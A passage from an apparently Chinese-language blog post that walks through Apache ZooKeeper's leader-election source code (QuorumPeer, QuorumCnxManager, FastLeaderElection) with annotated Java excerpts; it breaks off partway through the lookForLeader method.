//设置当前server的地址信息 for (QuorumServer p : getView().values()) &#123; if (p.id == myid) &#123; myQuorumAddr = p.addr; break; &#125; &#125; //找不到地址信息,抛出异常 if (myQuorumAddr == null) &#123; throw new RuntimeException(\"My id \" + myid + \" not in the peer list\"); &#125; //选举类型为0 if (electionType == 0) &#123; try &#123; //初始化socket udpSocket = new DatagramSocket(myQuorumAddr.getPort()); //启动相应线程开始投票 responder = new ResponderThread(); responder.start(); &#125; catch (SocketException e) &#123; throw new RuntimeException(e); &#125; &#125; //创建选举算法 this.electionAlg = createElectionAlgorithm(electionType); &#125; ResponderThread 的 run 方法投票响应线程,响应当前 server id 和 zxid。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778class ResponderThread extends ZooKeeperThread &#123; ResponderThread() &#123; super(\"ResponderThread\"); &#125; volatile boolean running = true; @Override public void run() &#123; try &#123; byte b[] = new byte[36]; ByteBuffer responseBuffer = ByteBuffer.wrap(b); //数据报信息 DatagramPacket packet = new DatagramPacket(b, b.length); while (running) &#123; //dup接收消息 udpSocket.receive(packet); if (packet.getLength() != 4) &#123; LOG.warn(\"Got more than just an xid! Len = \" + packet.getLength()); &#125; else &#123; responseBuffer.clear(); responseBuffer.getInt(); // Skip the xid responseBuffer.putLong(myid); //获取当前投票信息 Vote current = getCurrentVote(); //server状态 switch (getPeerState()) &#123; //仍在选举leader case LOOKING: responseBuffer.putLong(current.getId()); responseBuffer.putLong(current.getZxid()); break; //当前为leader case LEADING: responseBuffer.putLong(myid); try &#123; long proposed; synchronized(leader) &#123; proposed = leader.lastProposed; &#125; responseBuffer.putLong(proposed); &#125; catch (NullPointerException npe) &#123; // This can happen in state transitions, // just ignore the request &#125; break; //当前为follower case FOLLOWING: responseBuffer.putLong(current.getId()); try &#123; responseBuffer.putLong(follower.getZxid()); &#125; catch (NullPointerException npe) &#123; // This can happen in state transitions, // just ignore the request &#125; break; // observer不参与投票 case OBSERVING: // Do nothing, Observers keep themselves to // themselves. break; &#125; packet.setData(b); //发送数据报 udpSocket.send(packet); &#125; packet.setLength(b.length); &#125; &#125; catch (RuntimeException e) &#123; LOG.warn(\"Unexpected runtime exception in ResponderThread\",e); &#125; catch (IOException e) &#123; LOG.warn(\"Unexpected IO exception in ResponderThread\",e); &#125; finally &#123; LOG.warn(\"QuorumPeer responder thread exited\"); &#125; &#125; &#125; QuorumPeer 的 createElectionAlgorithm 的方法根据选举类型创建选举算法. 1234567891011121314151617181920212223242526272829protected Election createElectionAlgorithm(int electionAlgorithm)&#123; Election le=null; //TODO: use a factory rather than a switch switch (electionAlgorithm) &#123; case 0: le = new LeaderElection(this); break; case 1: le = new AuthFastLeaderElection(this); break; case 2: le = new AuthFastLeaderElection(this, true); break; case 3: qcm = createCnxnManager(); QuorumCnxManager.Listener listener = qcm.listener; if(listener != null)&#123; listener.start(); le = new FastLeaderElection(this, qcm); &#125; else &#123; LOG.error(\"Null listener when initializing cnx manager\"); &#125; break; default: assert false; &#125; return le; &#125; 系统默认的选举算法为 FastLeaderElection。下边主要看这一部分方法的实现。 QuorumCnxManager.Listener快速 leader 选举算法实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980//创建leader选举的TCP连接管理public QuorumCnxManager createCnxnManager() &#123; return new QuorumCnxManager(this.getId(), this.getView(), this.authServer, this.authLearner, this.tickTime * this.syncLimit, this.getQuorumListenOnAllIPs(), this.quorumCnxnThreadsSize, this.isQuorumSaslAuthEnabled()); &#125;// visible for testing public QuorumCnxManager(final long mySid, Map&lt;Long,QuorumPeer.QuorumServer&gt; view, QuorumAuthServer authServer, QuorumAuthLearner authLearner, int socketTimeout, boolean listenOnAllIPs, int quorumCnxnThreadsSize, boolean quorumSaslAuthEnabled, ConcurrentHashMap&lt;Long, SendWorker&gt; senderWorkerMap) &#123; this.senderWorkerMap = senderWorkerMap; this.recvQueue = new ArrayBlockingQueue&lt;Message&gt;(RECV_CAPACITY); this.queueSendMap = new ConcurrentHashMap&lt;Long, ArrayBlockingQueue&lt;ByteBuffer&gt;&gt;(); this.lastMessageSent = new ConcurrentHashMap&lt;Long, ByteBuffer&gt;(); String cnxToValue = System.getProperty(\"zookeeper.cnxTimeout\"); if(cnxToValue != null)&#123; this.cnxTO = Integer.parseInt(cnxToValue); &#125; this.mySid = mySid; this.socketTimeout = socketTimeout; this.view = view; this.listenOnAllIPs = listenOnAllIPs; initializeAuth(mySid, authServer, authLearner, quorumCnxnThreadsSize, quorumSaslAuthEnabled); //启动listener线程，等待连接请求 listener = new Listener(); &#125;//初始化认证private void initializeAuth(final long mySid, final QuorumAuthServer authServer, final QuorumAuthLearner authLearner, final int quorumCnxnThreadsSize, final boolean quorumSaslAuthEnabled) &#123; this.authServer = authServer; this.authLearner = authLearner; this.quorumSaslAuthEnabled = quorumSaslAuthEnabled; if (!this.quorumSaslAuthEnabled) &#123; LOG.debug(\"Not initializing connection executor as quorum sasl auth is disabled\"); return; &#125; // init connection executors final AtomicInteger threadIndex = new AtomicInteger(1); SecurityManager s = System.getSecurityManager(); final ThreadGroup group = (s != null) ? s.getThreadGroup() : Thread.currentThread().getThreadGroup(); ThreadFactory daemonThFactory = new ThreadFactory() &#123; @Override public Thread newThread(Runnable r) &#123; Thread t = new Thread(group, r, \"QuorumConnectionThread-\" + \"[myid=\" + mySid + \"]-\" + threadIndex.getAndIncrement()); return t; &#125; &#125;; //创建线程池 this.connectionExecutor = new ThreadPoolExecutor(3, quorumCnxnThreadsSize, 60, TimeUnit.SECONDS, new SynchronousQueue&lt;Runnable&gt;(), daemonThFactory); this.connectionExecutor.allowCoreThreadTimeOut(true); &#125; 初始化监听 listener,并启动线程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101/** * Thread to listen on some port */ public class Listener extends ZooKeeperThread &#123; volatile ServerSocket ss = null; public Listener() &#123; // During startup of thread, thread name will be overridden to // specific election address super(\"ListenerThread\"); &#125; /** * Sleeps on accept(). */ @Override public void run() &#123; //重试次数 int numRetries = 0; InetSocketAddress addr; //socket未关闭且重试次数小于3 while((!shutdown) &amp;&amp; (numRetries &lt; 3))&#123; try &#123; ss = new ServerSocket(); ss.setReuseAddress(true); if (listenOnAllIPs) &#123; //选举端口启动socket监听 int port = view.get(QuorumCnxManager.this.mySid) .electionAddr.getPort(); addr = new InetSocketAddress(port); &#125; else &#123; addr = view.get(QuorumCnxManager.this.mySid) .electionAddr; &#125; LOG.info(\"My election bind port: \" + addr.toString()); //修改线程名称 setName(view.get(QuorumCnxManager.this.mySid) .electionAddr.toString()); ss.bind(addr); while (!shutdown) &#123; Socket client = ss.accept(); setSockOpts(client); LOG.info(\"Received connection request \" + client.getRemoteSocketAddress()); // Receive and handle the connection request // asynchronously if the quorum sasl authentication is // enabled. This is required because sasl server // authentication process may take few seconds to finish, // this may delay next peer connection requests. if (quorumSaslAuthEnabled) &#123; receiveConnectionAsync(client); &#125; else &#123; //接收连接请求 receiveConnection(client); &#125; //重试次数设为0 numRetries = 0; &#125; &#125; catch (IOException e) &#123; LOG.error(\"Exception while listening\", e); //异常，重试次数+1 numRetries++; try &#123; ss.close(); Thread.sleep(1000); &#125; catch (IOException ie) &#123; LOG.error(\"Error closing server socket\", ie); &#125; catch (InterruptedException ie) &#123; LOG.error(\"Interrupted while sleeping. \" + \"Ignoring exception\", ie); &#125; &#125; &#125; LOG.info(\"Leaving listener\"); if (!shutdown) &#123; LOG.error(\"As I'm leaving the listener thread, \" + \"I won't be able to participate in leader \" + \"election any longer: \" + view.get(QuorumCnxManager.this.mySid).electionAddr); &#125; &#125; /** * Halts this listener thread. */ void halt()&#123; try&#123; LOG.debug(\"Trying to close listener: \" + ss); if(ss != null) &#123; LOG.debug(\"Closing listener: \" + QuorumCnxManager.this.mySid); ss.close(); &#125; &#125; catch (IOException e)&#123; LOG.warn(\"Exception when shutting down listener: \" + e); &#125; &#125; &#125; 接着看 receiveConnection 接收请求的逻辑 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108/** * If this server receives a connection request, then it gives up on the new * connection if it wins. Notice that it checks whether it has a connection * to this server already or not. If it does, then it sends the smallest * possible long value to lose the challenge. * */ public void receiveConnection(final Socket sock) &#123; DataInputStream din = null; try &#123; din = new DataInputStream( new BufferedInputStream(sock.getInputStream())); //处理请求 handleConnection(sock, din); &#125; catch (IOException e) &#123; LOG.error(\"Exception handling connection, addr: &#123;&#125;, closing server connection\", sock.getRemoteSocketAddress()); closeSocket(sock); &#125; &#125;//处理连接请求private void handleConnection(Socket sock, DataInputStream din) throws IOException &#123; Long sid = null; try &#123; //获取server id sid = din.readLong(); if (sid &lt; 0) &#123; // this is not a server id but a protocol version (see ZOOKEEPER-1633) sid = din.readLong(); // next comes the #bytes in the remainder of the message // note that 0 bytes is fine (old servers) int num_remaining_bytes = din.readInt(); if (num_remaining_bytes &lt; 0 || num_remaining_bytes &gt; maxBuffer) &#123; LOG.error(\"Unreasonable buffer length: &#123;&#125;\", num_remaining_bytes); closeSocket(sock); return; &#125; byte[] b = new byte[num_remaining_bytes]; // remove the remainder of the message from din int num_read = din.read(b); if (num_read != num_remaining_bytes) &#123; LOG.error(\"Read only \" + num_read + \" bytes out of \" + num_remaining_bytes + \" sent by server \" + sid); &#125; &#125; //服务为observer if (sid == QuorumPeer.OBSERVER_ID) &#123; /* * Choose identifier at random. We need a value to identify * the connection. */ sid = observerCounter.getAndDecrement(); LOG.info(\"Setting arbitrary identifier to observer: \" + sid); &#125; &#125; catch (IOException e) &#123; closeSocket(sock); LOG.warn(\"Exception reading or writing challenge: \" + e.toString()); return; &#125; // do authenticating learner LOG.debug(\"Authenticating learner server.id: &#123;&#125;\", sid); authServer.authenticate(sock, din); //If wins the challenge, then close the new connection. if (sid &lt; this.mySid) &#123; /* * This replica might still believe that the connection to sid is * up, so we have to shut down the workers before trying to open a * new connection. */ SendWorker sw = senderWorkerMap.get(sid); if (sw != null) &#123; sw.finish(); &#125; /* * Now we start a new connection */ LOG.debug(\"Create new connection to server: \" + sid); closeSocket(sock); connectOne(sid); // Otherwise start worker threads to receive data. &#125; else &#123; //发送请求线程 SendWorker sw = new SendWorker(sock, sid); //接收请求线程 RecvWorker rw = new RecvWorker(sock, din, sid, sw); sw.setRecv(rw); SendWorker vsw = senderWorkerMap.get(sid); if(vsw != null) vsw.finish(); senderWorkerMap.put(sid, sw); queueSendMap.putIfAbsent(sid, new ArrayBlockingQueue&lt;ByteBuffer&gt;(SEND_CAPACITY)); //启动发送和接收线程 sw.start(); rw.start(); return; &#125; &#125; 发送请求和接收请求线程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247/** * Thread to send messages. Instance waits on a queue, and send a message as * soon as there is one available. If connection breaks, then opens a new * one. */ class SendWorker extends ZooKeeperThread &#123; Long sid; Socket sock; RecvWorker recvWorker; volatile boolean running = true; DataOutputStream dout; /** * An instance of this thread receives messages to send * through a queue and sends them to the server sid. * * @param sock * Socket to remote peer * @param sid * Server identifier of remote peer */ SendWorker(Socket sock, Long sid) &#123; super(\"SendWorker:\" + sid); this.sid = sid; this.sock = sock; recvWorker = null; try &#123; dout = new DataOutputStream(sock.getOutputStream()); &#125; catch (IOException e) &#123; LOG.error(\"Unable to access socket output stream\", e); closeSocket(sock); running = false; &#125; LOG.debug(\"Address of remote peer: \" + this.sid); &#125; synchronized void setRecv(RecvWorker recvWorker) &#123; this.recvWorker = recvWorker; &#125; /** * Returns RecvWorker that pairs up with this SendWorker. * * @return RecvWorker */ synchronized RecvWorker getRecvWorker()&#123; return recvWorker; &#125; synchronized boolean finish() &#123; if (LOG.isDebugEnabled()) &#123; LOG.debug(\"Calling finish for \" + sid); &#125; if(!running)&#123; /* * Avoids running finish() twice. */ return running; &#125; running = false; closeSocket(sock); // channel = null; this.interrupt(); if (recvWorker != null) &#123; recvWorker.finish(); &#125; if (LOG.isDebugEnabled()) &#123; LOG.debug(\"Removing entry from senderWorkerMap sid=\" + sid); &#125; senderWorkerMap.remove(sid, this); threadCnt.decrementAndGet(); return running; &#125; /** 发送请求 */ synchronized void send(ByteBuffer b) throws IOException &#123; byte[] msgBytes = new byte[b.capacity()]; try &#123; b.position(0); b.get(msgBytes); &#125; catch (BufferUnderflowException be) &#123; LOG.error(\"BufferUnderflowException \", be); return; &#125; dout.writeInt(b.capacity()); dout.write(b.array()); dout.flush(); &#125; @Override public void run() &#123; threadCnt.incrementAndGet(); try &#123; /** * If there is nothing in the queue to send, then we * send the lastMessage to ensure that the last message * was received by the peer. The message could be dropped * in case self or the peer shutdown their connection * (and exit the thread) prior to reading/processing * the last message. Duplicate messages are handled correctly * by the peer. * * If the send queue is non-empty, then we have a recent * message than that stored in lastMessage. To avoid sending * stale message, we should send the message in the send queue. */ ArrayBlockingQueue&lt;ByteBuffer&gt; bq = queueSendMap.get(sid); //如果发送队列为空 if (bq == null || isSendQueueEmpty(bq)) &#123; //获取最后发送的数据信息,确保最后发送的消息被集群接收。 ByteBuffer b = lastMessageSent.get(sid); if (b != null) &#123; LOG.debug(\"Attempting to send lastMessage to sid=\" + sid); send(b); &#125; &#125; &#125; catch (IOException e) &#123; LOG.error(\"Failed to send last message. Shutting down thread.\", e); this.finish(); &#125; try &#123; while (running &amp;&amp; !shutdown &amp;&amp; sock != null) &#123; ByteBuffer b = null; try &#123; //发送队列不为空 ArrayBlockingQueue&lt;ByteBuffer&gt; bq = queueSendMap .get(sid); if (bq != null) &#123; b = pollSendQueue(bq, 1000, TimeUnit.MILLISECONDS); &#125; else &#123; LOG.error(\"No queue of incoming messages for \" + \"server \" + sid); break; &#125; // 发送消息 if(b != null)&#123; lastMessageSent.put(sid, b); send(b); &#125; &#125; catch (InterruptedException e) &#123; LOG.warn(\"Interrupted while waiting for message on queue\", e); &#125; &#125; &#125; catch (Exception e) &#123; LOG.warn(\"Exception when using channel: for id \" + sid + \" my id = \" + QuorumCnxManager.this.mySid + \" error = \" + e); &#125; this.finish(); LOG.warn(\"Send worker leaving thread\"); &#125; &#125; /** * Thread to receive messages. Instance waits on a socket read. If the * channel breaks, then removes itself from the pool of receivers. 接收消息 */ class RecvWorker extends ZooKeeperThread &#123; Long sid; Socket sock; volatile boolean running = true; final DataInputStream din; final SendWorker sw; RecvWorker(Socket sock, DataInputStream din, Long sid, SendWorker sw) &#123; super(\"RecvWorker:\" + sid); this.sid = sid; this.sock = sock; this.sw = sw; this.din = din; try &#123; // OK to wait until socket disconnects while reading. sock.setSoTimeout(0); &#125; catch (IOException e) &#123; LOG.error(\"Error while accessing socket for \" + sid, e); closeSocket(sock); running = false; &#125; &#125; /** * Shuts down this worker * * @return boolean Value of variable running */ synchronized boolean finish() &#123; if(!running)&#123; /* * Avoids running finish() twice. */ return running; &#125; running = false; this.interrupt(); threadCnt.decrementAndGet(); return running; &#125; @Override public void run() &#123; threadCnt.incrementAndGet(); try &#123; while (running &amp;&amp; !shutdown &amp;&amp; sock != null) &#123; /** * Reads the first int to determine the length of the * message */ int length = din.readInt(); if (length &lt;= 0 || length &gt; PACKETMAXSIZE) &#123; throw new IOException( \"Received packet with invalid packet: \" + length); &#125; /** * Allocates a new ByteBuffer to receive the message */ byte[] msgArray = new byte[length]; din.readFully(msgArray, 0, length); ByteBuffer message = ByteBuffer.wrap(msgArray); //添加到接收队列中 addToRecvQueue(new Message(message.duplicate(), sid)); &#125; &#125; catch (Exception e) &#123; LOG.warn(\"Connection broken for id \" + sid + \", my id = \" + QuorumCnxManager.this.mySid + \", error = \" , e); &#125; finally &#123; LOG.warn(\"Interrupting SendWorker\"); sw.finish(); if (sock != null) &#123; closeSocket(sock); &#125; &#125; &#125; &#125; FastLeaderElection终于到快速选举算法的实现了 123456789101112131415161718192021222324252627//初始化 public FastLeaderElection(QuorumPeer self, QuorumCnxManager manager)&#123; this.stop = false; this.manager = manager; starter(self, manager); &#125;//starter /** * This method is invoked by the constructor. Because it is a * part of the starting procedure of the object that must be on * any constructor of this class, it is probably best to keep as * a separate method. As we have a single constructor currently, * it is not strictly necessary to have it separate. * * @param self QuorumPeer that created this object * @param manager Connection manager */ private void starter(QuorumPeer self, QuorumCnxManager manager) &#123; this.self = self; proposedLeader = -1; proposedZxid = -1; sendqueue = new LinkedBlockingQueue&lt;ToSend&gt;(); recvqueue = new LinkedBlockingQueue&lt;Notification&gt;(); this.messenger = new Messenger(manager); &#125; 来看 Message 的构造器 12345678910111213141516Messenger(QuorumCnxManager manager) &#123; this.ws = new WorkerSender(manager); Thread t = new Thread(this.ws, \"WorkerSender[myid=\" + self.getId() + \"]\"); t.setDaemon(true); t.start(); this.wr = new WorkerReceiver(manager); t = new Thread(this.wr, \"WorkerReceiver[myid=\" + self.getId() + \"]\"); t.setDaemon(true); t.start(); &#125; 启动两个守护线程来处理发送和接收请求 WorkerSender 发送请求1234567891011121314151617181920212223242526272829303132333435363738class WorkerSender extends ZooKeeperThread &#123; volatile boolean stop; QuorumCnxManager manager; WorkerSender(QuorumCnxManager manager)&#123; super(\"WorkerSender\"); this.stop = false; this.manager = manager; &#125; public void run() &#123; while (!stop) &#123; try &#123; ToSend m = sendqueue.poll(3000, TimeUnit.MILLISECONDS); if(m == null) continue; process(m); &#125; catch (InterruptedException e) &#123; break; &#125; &#125; LOG.info(\"WorkerSender is down\"); &#125; /** * Called by run() once there is a new message to send. * * @param m message to send */ void process(ToSend m) &#123; ByteBuffer requestBuffer = buildMsg(m.state.ordinal(), m.leader, m.zxid, m.electionEpoch, m.peerEpoch); manager.toSend(m.sid, requestBuffer); &#125; &#125; toSend 方法实现 12345678910111213141516171819202122232425262728293031323334/** * Processes invoke this message to queue a message to send. Currently, * only leader election uses it. */ public void toSend(Long sid, ByteBuffer b) &#123; /* * If sending message to myself, then simply enqueue it (loopback). 如果投票给自己 */ if (this.mySid == sid) &#123; b.position(0); //添加到接收队列 addToRecvQueue(new Message(b.duplicate(), sid)); /* * Otherwise send to the corresponding thread to send. */ &#125; else &#123; /* * Start a new connection if doesn't have one already. */ ArrayBlockingQueue&lt;ByteBuffer&gt; bq = new ArrayBlockingQueue&lt;ByteBuffer&gt;(SEND_CAPACITY); ArrayBlockingQueue&lt;ByteBuffer&gt; bqExisting = queueSendMap.putIfAbsent(sid, bq); //添加到发送队列 if (bqExisting != null) &#123; addToSendQueue(bqExisting, b); &#125; else &#123; addToSendQueue(bq, b); &#125; //和sid对应的服务建立连接 connectOne(sid); &#125; &#125; 接着看 connectOne 方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556synchronized public void connectOne(long sid)&#123; if (!connectedToPeer(sid))&#123; InetSocketAddress electionAddr; if (view.containsKey(sid)) &#123; electionAddr = view.get(sid).electionAddr; &#125; else &#123; LOG.warn(\"Invalid server id: \" + sid); return; &#125; try &#123; LOG.debug(\"Opening channel to server \" + sid); //和sid对应server建立连接 Socket sock = new Socket(); setSockOpts(sock); sock.connect(view.get(sid).electionAddr, cnxTO); LOG.debug(\"Connected to server \" + sid); // Sends connection request asynchronously if the quorum // sasl authentication is enabled. This is required because // sasl server authentication process may take few seconds to // finish, this may delay next peer connection requests. if (quorumSaslAuthEnabled) &#123; initiateConnectionAsync(sock, sid); //建立连接,将服务id发送给对方服务 &#125; else &#123; initiateConnection(sock, sid); &#125; &#125; catch (UnresolvedAddressException e) &#123; // Sun doesn't include the address that causes this // exception to be thrown, also UAE cannot be wrapped cleanly // so we log the exception in order to capture this critical // detail. LOG.warn(\"Cannot open channel to \" + sid + \" at election address \" + electionAddr, e); // Resolve hostname for this server in case the // underlying ip address has changed. if (view.containsKey(sid)) &#123; view.get(sid).recreateSocketAddresses(); &#125; throw e; &#125; catch (IOException e) &#123; LOG.warn(\"Cannot open channel to \" + sid + \" at election address \" + electionAddr, e); // We can't really tell if the server is actually down or it failed // to connect to the server because the underlying IP address // changed. Resolve the hostname again just in case. if (view.containsKey(sid)) &#123; view.get(sid).recreateSocketAddresses(); &#125; &#125; &#125; else &#123; LOG.debug(\"There is a connection already for server \" + sid); &#125; &#125; WorkerReceiver 接收请求123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188class WorkerReceiver extends ZooKeeperThread &#123; volatile boolean stop; QuorumCnxManager manager; WorkerReceiver(QuorumCnxManager manager) &#123; super(\"WorkerReceiver\"); this.stop = false; this.manager = manager; &#125; public void run() &#123; Message response; while (!stop) &#123; // Sleeps on receive try&#123; response = manager.pollRecvQueue(3000, TimeUnit.MILLISECONDS); if(response == null) continue; /* * If it is from an observer, respond right away. * Note that the following predicate assumes that * if a server is not a follower, then it must be * an observer. If we ever have any other type of * learner in the future, we'll have to change the * way we check for observers. */ if(!validVoter(response.sid))&#123; Vote current = self.getCurrentVote(); ToSend notmsg = new ToSend(ToSend.mType.notification, current.getId(), current.getZxid(), logicalclock.get(), self.getPeerState(), response.sid, current.getPeerEpoch()); sendqueue.offer(notmsg); &#125; else &#123; // Receive new message if (LOG.isDebugEnabled()) &#123; LOG.debug(\"Receive new notification message. My id = \" + self.getId()); &#125; /* * We check for 28 bytes for backward compatibility 响应字节数&lt;28 */ if (response.buffer.capacity() &lt; 28) &#123; LOG.error(\"Got a short response: \" + response.buffer.capacity()); continue; &#125; boolean backCompatibility = (response.buffer.capacity() == 28); response.buffer.clear(); // 实例化Notification Notification n = new Notification(); // server的ack状态 QuorumPeer.ServerState ackstate = QuorumPeer.ServerState.LOOKING; switch (response.buffer.getInt()) &#123; case 0: ackstate = QuorumPeer.ServerState.LOOKING; break; case 1: ackstate = QuorumPeer.ServerState.FOLLOWING; break; case 2: ackstate = QuorumPeer.ServerState.LEADING; break; case 3: ackstate = QuorumPeer.ServerState.OBSERVING; break; default: continue; &#125; n.leader = response.buffer.getLong(); n.zxid = response.buffer.getLong(); n.electionEpoch = response.buffer.getLong(); n.state = ackstate; n.sid = response.sid; if(!backCompatibility)&#123; n.peerEpoch = response.buffer.getLong(); &#125; else &#123; if(LOG.isInfoEnabled())&#123; LOG.info(\"Backward compatibility mode, server id=\" + n.sid); &#125; n.peerEpoch = ZxidUtils.getEpochFromZxid(n.zxid); &#125; /* * Version added in 3.4.6 */ n.version = (response.buffer.remaining() &gt;= 4) ? response.buffer.getInt() : 0x0; /* * Print notification info */ if(LOG.isInfoEnabled())&#123; printNotification(n); &#125; /* * If this server is looking, then send proposed leader 如果服务状态为looking,则发送leader选举提议信息 */ if(self.getPeerState() == QuorumPeer.ServerState.LOOKING)&#123; recvqueue.offer(n); /* * Send a notification back if the peer that sent this * message is also looking and its logical clock is * lagging behind. */ if((ackstate == QuorumPeer.ServerState.LOOKING) &amp;&amp; (n.electionEpoch &lt; logicalclock.get()))&#123; //封装投票信息 Vote v = getVote(); //待发送信息 ToSend notmsg = new ToSend(ToSend.mType.notification, v.getId(), v.getZxid(), logicalclock.get(), self.getPeerState(), response.sid, v.getPeerEpoch()); //放入发送队列 sendqueue.offer(notmsg); &#125; &#125; else &#123; /* * If this server is not looking, but the one that sent the ack * is looking, then send back what it believes to be the leader. 如果收到的请求ack状态为looking但是当前server不是looking状态 */ Vote current = self.getCurrentVote(); if(ackstate == QuorumPeer.ServerState.LOOKING)&#123; if(LOG.isDebugEnabled())&#123; LOG.debug(\"Sending new notification. My id = \" + self.getId() + \" recipient=\" + response.sid + \" zxid=0x\" + Long.toHexString(current.getZxid()) + \" leader=\" + current.getId()); &#125; ToSend notmsg; //版本大于0 if(n.version &gt; 0x0) &#123; notmsg = new ToSend( ToSend.mType.notification, current.getId(), current.getZxid(), current.getElectionEpoch(), self.getPeerState(), response.sid, current.getPeerEpoch()); &#125; else &#123; //返回对方server的投票信息 Vote bcVote = self.getBCVote(); notmsg = new ToSend( ToSend.mType.notification, bcVote.getId(), bcVote.getZxid(), bcVote.getElectionEpoch(), self.getPeerState(), response.sid, bcVote.getPeerEpoch()); &#125; //放入发送队列 sendqueue.offer(notmsg); &#125; &#125; &#125; &#125; catch (InterruptedException e) &#123; System.out.println(\"Interrupted Exception while waiting for new message\" + e.toString()); &#125; &#125; LOG.info(\"WorkerReceiver is down\"); &#125; &#125; 启动 QuorumPeer 线程启动选举算法后,开始启动当前线程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157public void run() &#123; setName(\"QuorumPeer\" + \"[myid=\" + getId() + \"]\" + cnxnFactory.getLocalAddress()); LOG.debug(\"Starting quorum peer\"); try &#123; jmxQuorumBean = new QuorumBean(this); MBeanRegistry.getInstance().register(jmxQuorumBean, null); for(QuorumServer s: getView().values())&#123; ZKMBeanInfo p; if (getId() == s.id) &#123; p = jmxLocalPeerBean = new LocalPeerBean(this); try &#123; MBeanRegistry.getInstance().register(p, jmxQuorumBean); &#125; catch (Exception e) &#123; LOG.warn(\"Failed to register with JMX\", e); jmxLocalPeerBean = null; &#125; &#125; else &#123; p = new RemotePeerBean(s); try &#123; MBeanRegistry.getInstance().register(p, jmxQuorumBean); &#125; catch (Exception e) &#123; LOG.warn(\"Failed to register with JMX\", e); &#125; &#125; &#125; &#125; catch (Exception e) &#123; LOG.warn(\"Failed to register with JMX\", e); jmxQuorumBean = null; &#125; try &#123; /* * Main loop */ while (running) &#123; switch (getPeerState()) &#123; case LOOKING: LOG.info(\"LOOKING\"); //只读模式是否启用 if (Boolean.getBoolean(\"readonlymode.enabled\")) &#123; LOG.info(\"Attempting to start ReadOnlyZooKeeperServer\"); // Create read-only server but don't start it immediately final ReadOnlyZooKeeperServer roZk = new ReadOnlyZooKeeperServer( logFactory, this, new ZooKeeperServer.BasicDataTreeBuilder(), this.zkDb); // Instead of starting roZk immediately, wait some grace // period before we decide we're partitioned. // // Thread is used here because otherwise it would require // changes in each of election strategy classes which is // unnecessary code coupling. Thread roZkMgr = new Thread() &#123; public void run() &#123; try &#123; // lower-bound grace period to 2 secs sleep(Math.max(2000, tickTime)); //只读模式启动,接收请求 if (ServerState.LOOKING.equals(getPeerState())) &#123; roZk.startup(); &#125; &#125; catch (InterruptedException e) &#123; LOG.info(\"Interrupted while attempting to start ReadOnlyZooKeeperServer, not started\"); &#125; catch (Exception e) &#123; LOG.error(\"FAILED to start ReadOnlyZooKeeperServer\", e); &#125; &#125; &#125;; try &#123; roZkMgr.start(); setBCVote(null); //用LeaderElection算法选举leader setCurrentVote(makeLEStrategy().lookForLeader()); &#125; catch (Exception e) &#123; LOG.warn(\"Unexpected exception\",e); setPeerState(ServerState.LOOKING); &#125; finally &#123; // If the thread is in the the grace period, interrupt // to come out of waiting. roZkMgr.interrupt(); roZk.shutdown(); &#125; &#125; else &#123; try &#123; setBCVote(null); setCurrentVote(makeLEStrategy().lookForLeader()); &#125; catch (Exception e) &#123; LOG.warn(\"Unexpected exception\", e); setPeerState(ServerState.LOOKING); &#125; &#125; break; case OBSERVING: try &#123; LOG.info(\"OBSERVING\"); //设置为observer setObserver(makeObserver(logFactory)); //和leader建立连接,同步数据 observer.observeLeader(); &#125; catch (Exception e) &#123; LOG.warn(\"Unexpected exception\",e ); &#125; finally &#123; observer.shutdown(); setObserver(null); setPeerState(ServerState.LOOKING); &#125; break; case FOLLOWING: try &#123; LOG.info(\"FOLLOWING\"); //设置为follower setFollower(makeFollower(logFactory)); //和leader同步信息 follower.followLeader(); &#125; catch (Exception e) &#123; LOG.warn(\"Unexpected exception\",e); &#125; finally &#123; follower.shutdown(); setFollower(null); setPeerState(ServerState.LOOKING); &#125; break; case LEADING: LOG.info(\"LEADING\"); try &#123; //设置为leader setLeader(makeLeader(logFactory)); //调用lead leader.lead(); setLeader(null); &#125; catch (Exception e) &#123; LOG.warn(\"Unexpected exception\",e); &#125; finally &#123; if (leader != null) &#123; leader.shutdown(\"Forcing shutdown\"); setLeader(null); &#125; setPeerState(ServerState.LOOKING); &#125; break; &#125; &#125; &#125; finally &#123; LOG.warn(\"QuorumPeer main thread exited\"); try &#123; MBeanRegistry.getInstance().unregisterAll(); &#125; catch (Exception e) &#123; LOG.warn(\"Failed to unregister with JMX\", e); &#125; jmxQuorumBean = null; jmxLocalPeerBean = null; &#125; &#125; looking 状态 makeLEStrategy 选举 leader12345678//初始化leader选举协议protected Election makeLEStrategy()&#123; LOG.debug(\"Initializing leader election protocol...\"); if (getElectionType() == 0) &#123; electionAlg = new LeaderElection(this); &#125; return electionAlg; &#125; 寻找或者选举中 leader 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149public Vote lookForLeader() throws InterruptedException &#123; try &#123; self.jmxLeaderElectionBean = new LeaderElectionBean(); MBeanRegistry.getInstance().register( self.jmxLeaderElectionBean, self.jmxLocalPeerBean); &#125; catch (Exception e) &#123; LOG.warn(\"Failed to register with JMX\", e); 